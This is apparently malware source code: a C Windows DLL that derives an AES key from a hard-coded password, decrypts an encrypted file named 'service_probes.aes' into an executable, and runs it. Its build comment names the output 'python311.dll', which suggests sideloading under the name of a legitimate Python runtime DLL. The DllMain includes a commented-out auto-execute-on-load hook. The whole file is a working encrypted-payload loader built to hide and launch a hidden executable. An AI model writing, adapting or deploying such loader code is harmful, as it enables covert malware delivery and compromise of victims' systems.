#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

// Constant key (same as encoder)
#define PASSWORD "we3p2v5t85"

// Function to convert password to MD5 hash (16-byte AES-128 key)
BOOL GetAESKeyFromPassword(BYTE* keyBuffer) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }
    
    if (!CryptHashData(hHash, (BYTE*)PASSWORD, strlen(PASSWORD), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }
    
    DWORD keyLen = 16; // MD5 produces 16-byte hash
    if (!CryptGetHashParam(hHash, HP_HASHVAL, keyBuffer, &keyLen, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }
    
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return TRUE;
}

// Function to decrypt AES-128-CBC encrypted file
BOOL DecryptFileToExe(LPCSTR inputFile, LPCSTR outputFile) {
    HANDLE hInFile = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInFile == INVALID_HANDLE_VALUE) {
        MessageBoxA(NULL, "Failed to open input file", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    // Read IV (first 16 bytes) and ciphertext
    BYTE iv[16];
    DWORD bytesRead;
    if (!ReadFile(hInFile, iv, 16, &bytesRead, NULL) || bytesRead != 16) {
        CloseHandle(hInFile);
        MessageBoxA(NULL, "Failed to read IV from input file", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    // Get file size to allocate buffer
    DWORD fileSize = GetFileSize(hInFile, NULL) - 16;
    BYTE* ciphertext = (BYTE*)malloc(fileSize);
    if (!ciphertext) {
        CloseHandle(hInFile);
        MessageBoxA(NULL, "Memory allocation failed", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    if (!ReadFile(hInFile, ciphertext, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(ciphertext);
        CloseHandle(hInFile);
        MessageBoxA(NULL, "Failed to read ciphertext from input file", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    CloseHandle(hInFile);
    
    // Get AES key from password
    BYTE key[16];
    if (!GetAESKeyFromPassword(key)) {
        free(ciphertext);
        MessageBoxA(NULL, "Failed to derive AES key from password", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    // Decrypt using Windows CNG (BCrypt)
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    
    status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        free(ciphertext);
        MessageBoxA(NULL, "Failed to open algorithm provider", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, key, 16, 0);
    if (!BCRYPT_SUCCESS(status)) {
        free(ciphertext);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        MessageBoxA(NULL, "Failed to generate symmetric key", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    // Setup decryption parameters
    DWORD blockLength = 0;
    DWORD result = 0;
    status = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PUCHAR)&blockLength, sizeof(DWORD), &result, 0);
    if (!BCRYPT_SUCCESS(status)) {
        free(ciphertext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        MessageBoxA(NULL, "Failed to get block length", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    // Decrypt the data
    BYTE* plaintext = (BYTE*)malloc(fileSize);
    if (!plaintext) {
        free(ciphertext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        MessageBoxA(NULL, "Memory allocation failed", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    ULONG plaintextSize = 0;
    status = BCryptDecrypt(hKey, ciphertext, fileSize, NULL, iv, 16, plaintext, fileSize, &plaintextSize, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        free(ciphertext);
        free(plaintext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        MessageBoxA(NULL, "Decryption failed", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    // Write decrypted data to output file
    HANDLE hOutFile = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutFile == INVALID_HANDLE_VALUE) {
        free(ciphertext);
        free(plaintext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        MessageBoxA(NULL, "Failed to create output file", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    if (!WriteFile(hOutFile, plaintext, plaintextSize, &bytesRead, NULL)) {
        free(ciphertext);
        free(plaintext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        CloseHandle(hOutFile);
        DeleteFileA(outputFile);
        MessageBoxA(NULL, "Failed to write output file", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }
    
    // Clean up
    free(ciphertext);
    free(plaintext);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    CloseHandle(hOutFile);
    
    return TRUE;
}

// Exported function to decrypt and execute
__declspec(dllexport) void DecryptAndExecute() {
    if (DecryptFileToExe("service_probes.aes", "service_probes.exe")) {
        // Execute the decrypted file
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "open";
        sei.lpFile = "service_probes.exe";
        sei.nShow = SW_SHOWNORMAL;
        
        if (!ShellExecuteExA(&sei)) {
            MessageBoxA(NULL, "Failed to execute decrypted file", "Error", MB_OK | MB_ICONERROR);
        }
    }
}

// DllMain - optional automatic execution when DLL loads
BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Uncomment to auto-decrypt and execute when DLL loads
        // DecryptAndExecute();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// gcc -shared -o python311.dll python311.c -lbcrypt